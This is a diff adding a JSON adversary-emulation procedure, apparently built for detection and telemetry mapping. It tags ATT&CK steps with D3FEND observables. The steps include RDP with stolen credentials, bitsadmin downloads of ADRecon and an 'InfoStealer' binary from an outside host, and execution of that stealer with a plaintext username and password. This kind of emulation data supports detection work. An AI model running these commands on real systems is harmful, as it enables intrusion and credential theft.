@@ -1,0 +1,210 @@
+{
+  "metadata": {
+    "source_file": "./enriched_control.json",
+    "enriched_at": "2026-01-20T12:09:11.520414",
+    "model": "openai/gpt-oss-120b",
+    "total_duration_ms": 142100
+  },
+  "procedure": {
+    "action_sequence": [
+      {
+        "step_id": 1,
+        "original_step_id": null,
+        "tactic": "Initial Access",
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "mstsc /v:10.20.20.11",
+        "description": "RDP from the contractor workstation to the corporate bastion host using the stolen contractor credentials.",
+        "d3fend_observables": [
+
+        ],
+        "execution_observables": [
+
+
+        ],
+        "telemetry_classes": [
+
+
+        ],
+        "execution_level": "non-elevated"
+      },
+       {
+        "step_id": 2,
+        "original_step_id": null,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer adrecon /download https://raw.githubusercontent.com/sense-of-security/ADRecon/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1 %USERPROFILE%\\Downloads\\ADRecon.ps1",
+        "description": "Download the ADRecon PowerShell script to the bastion host for AD enumeration.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Directory",
+          "ExecutableBinary",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL",
+          "WebNetworkTraffic"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 3,
+        "original_step_id": null,
+        "tactic": "Discovery",
+        "technique_id": "T1087.002",
+        "technique_name": "Account Discovery: Domain Account",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "powershell -ExecutionPolicy Bypass -Scope CurrentUser -File \"%USERPROFILE%\\Downloads\\ADRecon.ps1\" -Collect GroupMembers,Computers -OutputType CSV",
+        "description": "Execute ADRecon to enumerate domain groups, privileged accounts, and domain\u2011joined computers.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "Directory",
+          "EventLog",
+          "ExecutableBinary",
+          "ExecutableScript",
+          "File",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "UserAccount"
+        ],
+        "execution_observables": [
+          "Credential",
+          "ExecutableScript",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 4,
+        "original_step_id": null,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "kimeramon",
+        "command": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "description": "Download the InfoStealer tool to the SQL host using BITS.",
+        "d3fend_observables": [
+
+        ],
+        "execution_observables": [
+
+        ],
+        "telemetry_classes": [
+
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 5,
+        "original_step_id": null,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Desktop Protocol",
+        "os": "Windows",
+        "host": "Bastion",
+        "command": "mstsc /v:10.20.10.122 ",
+        "description": "RDP from the bastion host to the datamon Server host to harvest additional credentials.",
+        "d3fend_observables": [
+          "CommandHistoryLog",
+          "Credential",
+          "EventLog",
+          "ExecutableBinary",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Password",
+          "Process",
+          "Session"
+        ],
+        "execution_observables": [
+          "Credential",
+          "Hostname",
+          "IPAddress",
+          "NetworkTraffic",
+          "Password",
+          "Process",
+          "Session"
+        ],
+        "telemetry_classes": [
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "elevated"
+      },
+      {
+        "step_id": 6,
+        "original_step_id": null,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "datamon",
+        "command": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "description": "Download InfoStealer onto the datamon Server host.",
+        "d3fend_observables": [
+
+        ],
+        "execution_observables": [
+
+        ],
+        "telemetry_classes": [
+
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 7,
+        "original_step_id": null,
+        "tactic": "Credential Access",
+        "technique_id": "T1555",
+        "technique_name": "Credentials from Password Stores",
+        "os": "Windows",
+        "host": "datamon",
+        "command": "%TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Execute InfoStealer against the SQL Server host using harvested credentials",
+        "d3fend_observables": [
+
+        ],
+        "execution_observables": [
+
+        ],
+        "telemetry_classes": [
+
+        ],
+        "execution_level": "non-elevated"
+      }
+    ]
+  }
+}
